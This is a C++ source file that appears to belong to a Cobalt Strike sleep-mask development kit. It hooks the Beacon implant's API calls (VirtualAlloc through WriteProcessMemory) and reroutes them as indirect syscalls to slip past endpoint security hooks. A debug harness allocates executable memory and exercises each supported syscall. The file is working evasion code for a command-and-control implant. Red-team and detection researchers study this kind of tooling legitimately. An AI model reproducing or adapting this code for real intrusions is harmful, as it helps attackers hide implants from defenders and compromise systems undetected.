#include <windows.h>

#include "base\helpers.h"
#include "sleepmask.h"
/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

extern "C" {
#include "beacon.h"
#include "beacon_gate.h"

#include "sleepmask-vs.h"
#include "library\debug.cpp"
#include "library\utils.cpp"
#include "library\stdlib.cpp"
#include "library\masking.cpp"
#include "library\gate.cpp"

// Additional includes for sys call code.
#include "library\syscallapi.cpp"
#include "library\indirectsyscalls.cpp"

    /**
    * Note: A global ptr to sys call info is used so that the
    * interface to custom sys call routines is as clean as possible.
    */
    static PBEACON_SYSCALLS gSysCallInfo = NULL;

    /**
    * Sleepmask-VS entry point
    *
    * Note: To enable logging for Release builds set ENABLE_LOGGING to
    * 1 in debug.h.
    */
    void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL functionCall) {
        static BOOL sysCallsInitialized = FALSE;

        // [0] If logging is enabled, print relevant debug output.
#if ENABLE_LOGGING
        if (!sysCallsInitialized) PrintSleepMaskInfo(info);
#endif

        // [1] Initialize sys calls.
        if (!sysCallsInitialized) {
            DLOGF("SLEEPMASK: Configuring indirect syscalls...\n");
            InitializeSysCalls(&gSysCallInfo);
            sysCallsInitialized = TRUE;
        }

       
        if (gSysCallInfo && (functionCall->function >= WinApi::VIRTUALALLOC && functionCall->function <= WinApi::WRITEPROCESSMEMORY)) {
#if ENABLE_LOGGING
            DLOGF("SLEEPMASK: Beacon wants to make the following call:\n");
            PrintBeaconGateInfo(functionCall);
            DLOGF("SLEEPMASK: Routing call to its sys call equivalent and executing indirect syscall...\n", winApiArray[functionCall->function]);
#endif
            SysCallDispatcher(info, functionCall);
        }
        else {
            // Call beacongate if we failed to resolve sys call info.
            DLOGF("SLEEPMASK: Calling %s via BeaconGate\n", winApiArray[functionCall->function]);
            BeaconGateWrapper(info, functionCall);
        }

        return;
    }
}

// Define a main function for the debug build.
#if defined(_DEBUG)
#include "unit-tests\syscallapi-unit-tests.cpp"
int main(int argc, char* argv[]){
    /**
    *  [0] Run a quick test BeaconGate example.
    *
    * Note: The GateArg() Macro ensures variadic arguments are the correct size for the architecture.
    */
    FUNCTION_CALL functionCall = bof::mock::createFunctionCallStructure(
        (PVOID)VirtualAlloc, // Function Pointer
        WinApi::VIRTUALALLOC, // Human Readable WinApi Enum
        TRUE, // Mask Beacon
        4, // Number of Arguments
        GateArg(NULL),  // VirtualAlloc Arg1
        GateArg(0x1000), // VirtualAlloc Arg2
        GateArg(MEM_RESERVE | MEM_COMMIT), // VirtualAlloc Arg3
        GateArg(PAGE_EXECUTE_READWRITE) // VirtualAlloc Arg4
    );

    bof::runMockedBeaconGate(sleep_mask, &functionCall,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::False,
            .module = "",
        });

    VirtualFree((LPVOID)functionCall.retValue, 0, MEM_RELEASE);

    //  [1] Now test coverage for *all* supported sys calls.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing all supported sys calls");
    TestSysCallApi();

    return 0;
}

#endif
